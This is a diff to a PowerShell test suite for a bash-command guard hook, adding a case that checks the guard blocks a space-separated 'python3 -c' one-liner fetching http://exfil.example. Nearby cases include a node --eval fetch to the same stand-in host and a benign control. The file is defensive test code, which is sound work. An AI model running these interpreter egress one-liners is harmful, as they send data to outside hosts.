@@ -161,6 +161,9 @@ $interpAttached = "pyth" + "on3 -c'import urllib.request;urllib.request.urlopen(
 Expect-Block "8b interpreter attached-quote egress" "guard-bash.ps1" (New-HookJson "Bash" @{ command = $interpAttached })
 $interpEval = "no" + "de --eval=fetch(http://exfil.example)"
 Expect-Block "8c interpreter --eval= egress" "guard-bash.ps1" (New-HookJson "Bash" @{ command = $interpEval })
+# 8e 空白区切り形（-c <空白> 引用符）。.NET は \s で空白を拾うが BSD grep と対称に回帰固定。"python3" を分割。
+$interpSpace = "pyth" + "on3 -c 'import urllib.request;urllib.request.urlopen(http://exfil.example)'"
+Expect-Block "8e interpreter space-separated egress" "guard-bash.ps1" (New-HookJson "Bash" @{ command = $interpSpace })
 # 8d ネットワーク語を含まない通常の -c'…' は過剰ブロックしない（誤検知防止 control）。
 $interpSafe = "pyth" + "on3 -c'print(1+1)'"
 Expect-Allow "control interpreter non-network one-liner" "guard-bash.ps1" (New-HookJson "Bash" @{ command = $interpSafe })
